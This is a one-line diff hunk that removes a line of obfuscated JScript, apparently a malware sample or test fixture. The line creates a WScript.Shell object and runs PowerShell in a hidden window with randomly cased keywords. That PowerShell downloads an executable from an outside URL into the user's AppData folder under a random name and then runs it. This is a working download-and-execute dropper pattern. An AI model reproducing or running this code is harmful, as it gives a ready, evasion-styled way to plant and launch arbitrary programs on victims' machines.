@@ -1,1 +1,0 @@
-  new  ActiveXObject("WScRIPt.sHeLl").RUn(  '"poWErSHELl.EXe"   	iNVoKE-WEBrEQUeSt 	-uRI 	”https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe”  -outFIle ”$EnV:apPDATa\dfwesfwefwefwe32.exe” 	; 	InVOkE-IteM  ”$EnV:aPpdaTA\dfwesfwefwefwe32.exe”'  ,  0  )  ;
